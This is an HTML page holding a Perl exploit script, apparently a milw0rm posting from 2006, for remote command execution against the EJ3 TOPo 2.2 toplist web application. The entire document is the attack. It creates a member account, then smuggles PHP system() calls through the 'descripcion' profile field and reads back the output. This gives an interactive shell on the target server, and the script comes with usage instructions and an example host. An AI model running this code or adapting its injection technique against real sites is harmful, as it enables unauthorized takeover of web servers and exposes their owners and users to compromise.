<html><head><title>EJ3 TOPo 2.2 (descripcion) Remote Command Execution Exploit </title></head><pre>#!/usr/bin/perl
#
# EJ3 TOPO  2.2 Remote Code Execution Exploit
# --------------------------------------------- 
# Note : This Exploit Just run TOPO 2.2
# IHST : www.Hackerz.Ir 
# AST  : www.aria-security.net
###### (C)oded &amp; Discovered By Hessam-x

use LWP::UserAgent;
use LWP::Simple;
use HTTP::Cookies;


 $host = $ARGV[0];

 $url = &quot;http://&quot;.$host;

&amp;hed;
    print &quot; [~] Host : $host \n&quot;;
    print &quot; [~] Conecting ...\n&quot;;


 $xpl = LWP::UserAgent-&gt;new() or die;
 $cookie_jar = HTTP::Cookies-&gt;new();
 $xpl-&gt;cookie_jar( $cookie_jar );
 
 $res = $xpl-&gt;post($url.'index.php',
 Content =&gt; [
 &quot;email&quot;   =&gt; &quot;info@yahoo.com&quot;,
 &quot;web&quot;   =&gt; &quot;Yahoo.Com&quot;,
 &quot;webURL&quot;   =&gt; &quot;http://www.yahoo.com&quot;,
 &quot;BannerURL&quot;   =&gt; &quot;http://www.yahoo.com/logo.jpg&quot;,
 &quot;descripcion&quot; =&gt; &quot;YAHOO!INC&quot;,
 &quot;country&quot; =&gt; &quot;as&quot;,
 &quot;m&quot; =&gt; &quot;members&quot;,
 &quot;s&quot; =&gt; &quot;html&quot;,
 &quot;t&quot; =&gt; &quot;join&quot;,
 &quot;paso&quot; =&gt; &quot;2&quot;,
 &quot;ID&quot; =&gt; &quot;shell&quot;,
 ],);

 print &quot; [+] Created a user ...\n&quot;;
 &amp;run;
 

 
 sub hed()
{
 print q(
 ###########################################################
 #        EJ3 TOPO &lt;= 2.1 Remote Code Execution Exploit    #
 #                                                         #
 ############# Coded &amp; discovered By Hessam-x ##############

);

 
 if (@ARGV &lt; 1) {
 print &quot; #  usage : hx.pl [host&amp;path]\n&quot;; 
 print &quot; #  E.g : hx.pl www.milw0rm.com/toplist/\n&quot;; 
  exit();
 }
 
} 
 
    while ()
{
    &amp;run
    }
  sub run()
 {  

      print &quot;\n[Shell]\$&quot;;
      chomp($exc=&lt;STDIN&gt;);
    
        exit() if ($exc eq 'exit');

 
 
  $commd = &quot;system(\&quot;$exc\&quot;)&quot;;
  $cmd  = 'echo 1 ; echo _START_ ; '.$commd.' ; echo _END_';


 $req = $xpl-&gt;post($url.'index.php',
 Content =&gt; [
 &quot;passwordNEW&quot; =&gt; &quot;0&quot;,
 &quot;email&quot;   =&gt; &quot;info@yahoo.com&quot;,
 &quot;webURL&quot;   =&gt; &quot;http://www.yahoo.com&quot;,
 &quot;BannerURL&quot;   =&gt; &quot;http://www.yahoo.com/logo.jpg&quot;,
 &quot;descripcion&quot; =&gt; &quot;YAHOO!INC' ;  $cmd ; ?&gt;//&quot;,
 &quot;country&quot; =&gt; &quot;unknow&quot;,
 &quot;m&quot; =&gt; &quot;members&quot;,
 &quot;s&quot; =&gt; &quot;html&quot;,
 &quot;t&quot; =&gt; &quot;edit&quot;,
 &quot;paso&quot; =&gt; &quot;2&quot;,
 &quot;password&quot; =&gt; &quot;0&quot;,
 &quot;ID&quot; =&gt; &quot;shell&quot;,
 ],);
 $res = $xpl-&gt;get($url.'index.php?m=top&amp;s=out&amp;ID=shell');
 @result = split(/\n/,$res-&gt;content);
 $runned = 0;
 $on = 0;
 print &quot;\n&quot;;
 for $res(@result)
  {
    if ($res =~ /^_END_/) { print &quot;\n&quot;; return 0; }
    if ($on == 0) { print &quot;  $res\n&quot;; }
    if ($res =~ /^_START_/) { $on = 1; $runned = 1; } 
  }
    if (!$runned) { print &quot;Can not execute command . EXPLOIT FAILED !\n&quot; ; };
   
  
  
  }

# milw0rm.com [2006-07-10]</pre></html>